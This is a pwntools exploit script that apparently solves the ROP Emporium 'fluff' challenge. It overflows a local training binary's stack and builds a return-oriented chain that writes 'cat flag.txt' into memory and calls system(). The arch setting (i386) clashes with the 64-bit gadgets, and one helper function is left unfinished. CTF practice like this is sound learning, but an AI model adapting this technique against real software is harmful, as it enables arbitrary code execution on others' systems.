from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')
# p = gdb.debug('./fluff')
p = process('./fluff')

def pop_r11(word):
    payload = b''
    payload += xor_r11_r11_addr
    payload += garbage # pop esi
    payload += pop_r12_addr
    payload += word
    payload += xor_r11_r12_addr
    payload += garbage # pop ebp
    return payload

def pop_r10(word):
    payload = b''
    payload += pop_r11(word)
    payload += xchg_r11_r10_addr
    payload += garbage # pop ebp
    return payload

def mov_0w_there(there):
    there = p64(there)
    payload = b''
    payload += pop_r10(there)
    payload += mov_r10_r11_addr
    payload += garbage # pop ebp
    payload += p64(0) # pop r12
    return payload

def mov_that_there(that,there):
    there = p64(there)
    payload = b''
    payload += pop_r10(there)
    payload += pop_r11(that)
    payload += mov_r10_r11_addr
    payload += garbage # pop ebp
    payload += garbage # pop r12
    return payload

def xor_byte_there(that,there):
    that = p64(that)
    there = p64(there)
    payload = b''
    payload += pop_r10(there)
    payload += pop_r12_addr
    payload += that
    return payload

padding = b'A'*40
xor_r11_r11_addr = p64(0x00400822)
pop_r12_addr = p64(0x400832)
xor_r11_r12_addr = p64(0x0040082f)
xchg_r11_r10_addr = p64(0x00400840)
mov_r10_r11_addr = p64(0x0040084e)
pop_rdi = p64(0x4008c3)
garbage = p64(0x0)
system = p64(0x004005e0)
data_int = 0x00601050
cmd = b"cat flag.txt".ljust(16,b'\x00')

payload = padding
for i in range(0,len(cmd),8):
    payload += mov_that_there(cmd[i:i+8],data_int+i)
payload += pop_rdi
payload += p64(data_int)
payload += system

p.sendline(payload)
print(p.recvall().decode())
